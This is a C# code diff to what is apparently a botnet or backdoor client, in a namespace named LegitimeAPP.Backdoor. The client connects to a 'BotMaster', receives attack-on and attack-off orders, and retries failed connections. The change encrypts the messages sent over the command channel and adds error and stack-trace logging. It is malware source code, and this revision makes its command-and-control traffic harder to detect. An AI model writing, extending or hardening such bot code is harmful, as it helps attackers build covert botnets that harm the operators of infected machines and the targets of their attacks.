@@ -7,7 +7,6 @@ using LegitimeAPP.OS ;
 
 namespace LegitimeAPP.Backdoor {
     public class Connection {
-
         private IPAddress _masterIP ;
         private int _masterPort ;
 
@@ -49,7 +48,7 @@ namespace LegitimeAPP.Backdoor {
             order.NewAttackOrder += delegate {
                 Console.WriteLine("L'attaque est on") ;
 
-                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ;
+                WriteNetMessage(Encryption.Encrypt(Data<Order>.DataToXml(new Order(TypeAction.ATTACK)),_encryption.SymmetricKey)) ;
 
                 _attackInProgress = true ; 
             } ;
@@ -57,7 +56,7 @@ namespace LegitimeAPP.Backdoor {
             order.EndAttackOrder += delegate {
                 Console.WriteLine("L'attaque est off") ;
 
-                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.WAIT))) ; 
+               WriteNetMessage(Encryption.Encrypt(Data<Order>.DataToXml(new Order(TypeAction.WAIT)),_encryption.SymmetricKey)) ; 
                 
 
                 _attackInProgress = false ;  
@@ -254,7 +253,9 @@ namespace LegitimeAPP.Backdoor {
                     _FollowingOrders.Start() ;
                     _FollowingOrders.Join() ;
                 } catch (Exception ex) {
-                    Console.WriteLine("La connexion au BotMaster est un échec... Code d'erreur : " + ex.Message +"... Tentative dans cinq secondes... "  ) ; 
+                    Console.WriteLine(" [ Exception ] La connexion au BotMaster est un échec... Code d'erreur : " + ex.Message +"... Tentative dans cinq secondes... "  ) ;
+
+                    Console.WriteLine("[ Trace ] "+ex.StackTrace) ; 
                 } 
 
 
